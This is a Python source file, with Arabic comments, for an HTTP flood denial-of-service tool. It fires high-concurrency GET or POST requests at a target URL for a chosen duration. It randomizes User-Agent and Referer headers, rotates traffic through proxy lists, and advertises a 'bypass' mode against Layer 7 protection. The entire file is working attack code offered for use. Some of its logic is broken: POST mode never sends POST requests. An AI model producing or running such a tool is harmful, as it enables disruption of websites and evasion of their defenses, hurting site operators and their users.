import asyncio
import aiohttp
import random
import time
import sys
import async_timeout

# قائمة User-Agents متنوعة وواقعية جداً
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/115.0",
    # أضف المزيد حسب الحاجة
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://duckduckgo.com/",
    # أضف المزيد
]

ACCEPT_ENCODINGS = ["gzip, deflate, br", "deflate, gzip", "br, gzip", "*/*"]

def get_random_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS),
        "Accept-Encoding": random.choice(ACCEPT_ENCODINGS),
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Connection": "keep-alive"
    }

def load_proxies(file_path):
    try:
        with open(file_path, "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        print(f"[+] Loaded {len(proxies)} proxies from {file_path}")
        return proxies
    except Exception as e:
        print(f"[-] Failed to load proxies: {e}")
        return []

async def fetch(session, method, url, data=None, proxy=None):
    headers = get_random_headers()
    retries = 3
    for attempt in range(retries):
        try:
            with async_timeout.timeout(15):
                if method == "POST":
                    async with session.post(url, data=data, headers=headers, proxy=proxy) as response:
                        await response.text()
                        return response.status
                else:
                    async with session.get(url, headers=headers, proxy=proxy) as response:
                        await response.text()
                        return response.status
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            if attempt == retries - 1:
                print(f"[-] Request failed after {retries} attempts: {e}")
            else:
                await asyncio.sleep(1)
    return None

async def attack_worker(url, duration, concurrency, method="GET", data=None, proxies=None):
    connector = aiohttp.TCPConnector(limit=concurrency, ssl=False, force_close=False, enable_cleanup_closed=True)
    timeout = aiohttp.ClientTimeout(total=20)
    end_time = time.time() + duration
    total_requests = 0
    successful_requests = 0

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = set()
        while time.time() < end_time:
            proxy = random.choice(proxies) if proxies else None
            task = asyncio.create_task(fetch(session, method, url, data, proxy))
            tasks.add(task)

            def task_done(t):
                nonlocal total_requests, successful_requests
                total_requests += 1
                if t.result() and 200 <= t.result() < 400:
                    successful_requests += 1
                tasks.discard(t)

            task.add_done_callback(task_done)

            if len(tasks) >= concurrency:
                await asyncio.sleep(0.01)  # حظر قليل للتقليل من الحمل
        # انتظر باقي المهام
        while tasks:
            await asyncio.sleep(0.01)
    print(f"\nAttack finished: Total requests sent: {total_requests}, Successful: {successful_requests}")

def print_usage():
    print("""
Usage:
 python3 core/runner.py <mode> <url> <duration_seconds> <concurrency> [proxy_file] [post_data]

Modes:
 GET                - Simple GET attack without proxy
 POST               - Simple POST attack without proxy, requires post_data
 bypass             - Layer 7 bypass attack with proxies (proxy_file required)
 proxy_get          - GET attack using proxies (proxy_file required)
 proxy_post         - POST attack using proxies (proxy_file required), requires post_data

Examples:
 python3 core/runner.py GET https://example.com 60 100
 python3 core/runner.py POST https://example.com 60 100 "" "param1=value1&param2=value2"
 python3 core/runner.py bypass https://example.com 60 100 proxy/socks5.txt
 python3 core/runner.py proxy_get https://example.com 60 100 proxy/http.txt
 python3 core/runner.py proxy_post https://example.com 60 100 proxy/http.txt "param1=value1&param2=value2"
""")

def main():
    if len(sys.argv) < 5:
        print_usage()
        sys.exit(1)

    mode = sys.argv[1].lower()
    url = sys.argv[2]
    duration = int(sys.argv[3])
    concurrency = int(sys.argv[4])

    proxy_file = None
    post_data = None
    proxies = None

    if mode in ["bypass", "proxy_get", "proxy_post"]:
        if len(sys.argv) < 6:
            print(f"Mode {mode} requires proxy_file argument.")
            print_usage()
            sys.exit(1)
        proxy_file = sys.argv[5]
        proxies = load_proxies(proxy_file)
        if not proxies:
            print("No proxies loaded, exiting.")
            sys.exit(1)

    if mode in ["post", "proxy_post"]:
        if len(sys.argv) < 7:
            print(f"Mode {mode} requires post_data argument.")
            print_usage()
            sys.exit(1)
        post_data = sys.argv[6]

    asyncio.run(attack_worker(url, duration, concurrency, method=mode if mode in ["get", "post"] else "GET", data=post_data, proxies=proxies))

if __name__ == "__main__":
    main()